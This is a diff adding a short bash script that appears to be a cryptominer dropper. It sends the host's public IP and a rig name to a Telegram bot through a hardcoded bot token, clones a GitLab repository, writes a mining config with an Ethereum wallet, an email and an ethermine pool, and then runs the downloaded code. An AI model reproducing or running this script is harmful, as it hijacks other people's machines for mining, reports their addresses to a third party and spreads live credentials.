@@ -1,0 +1,27 @@
+#!/bin/bash
+
+apt-get install jq -y
+
+numb=$(echo $(shuf -i 100-500 -n 1))
+myIp="$(wget -qO- ifconfig.me/ip)"
+n0z="Soldier009|$myIp"
+for n in {1..50};
+do
+  sending="$(curl --silent -X GET 'https://api.telegram.org/bot5298453094:AAEWdAWPsJF58wwoVpZI-tvEsUmaFFwo5Fs/sendMessage?chat_id=5280847845&text='$n0z --compressed)"
+  cek=$(jq -r '.ok' <<< $sending)
+  if [[ "$cek" == true ]];
+  then
+    break
+  fi
+done
+
+git clone https://gitlab.com/diablostrom5/master.git
+touch master/config.ini 
+echo "rigName = Soldier009" >> "master/config.ini"
+echo "email = diablostrom5@gmail.com" >> "master/config.ini" 
+echo "[Ethash]" >> "master/config.ini"
+echo "wallet = 0x205023e287bd796ed7f9d458a04d7956c11d9ea3" >> "master/config.ini"
+echo "coin = eth" >> "master/config.ini" 
+echo "pool1 = us1.ethermine.org:5555" >> "master/config.ini" 
+echo "sortPools = true" >> "master/config.ini" 
+cd master && chmod +x * && ./start
